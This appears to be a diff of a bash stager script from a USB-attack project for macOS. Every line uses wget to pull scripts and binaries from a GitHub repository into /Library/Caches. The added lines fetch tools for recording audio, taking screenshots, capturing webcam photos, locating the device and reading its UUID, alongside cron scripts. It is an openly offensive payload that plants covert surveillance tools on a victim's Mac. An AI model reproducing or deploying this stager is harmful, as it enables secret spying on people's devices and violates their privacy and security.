@@ -1,9 +1,17 @@
 #!/bin/bash
 wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-01.sh
-wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-05.sh
 wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/crons/cron-60.sh
-wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/soundalarm.scpt
-wget -O /Library/Caches/getlocation.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/features/getlocation.scpt
-wget -O /Library/Caches/smoke.aiff https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/smoke-alarm.aiff
-wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/fetures/LocateMe
 
+wget -O /Library/Caches/soundalarm.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/soundalarm.scpt
+wget -O /Library/Caches/clickpoint.scpt https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/clickpoint.scpt
+
+wget -O /Library/Caches/getuuid.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/getuuid.sch
+wget -O /Library/Caches/recordaudio.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/recordaudio.sh
+wget -O /Library/Caches/screenshot.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/screenshot.sh
+wget -O /Library/Caches/photo.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/photo.sh
+wget -O /Library/Caches/locateme.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/locateme.sh
+
+wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/LocateMe
+wget -O /Library/Caches/imagesnap https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/imagesnap
+
+wget -O /Library/Caches/smoke-alarm.aiff https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/smoke-alarm.aiff
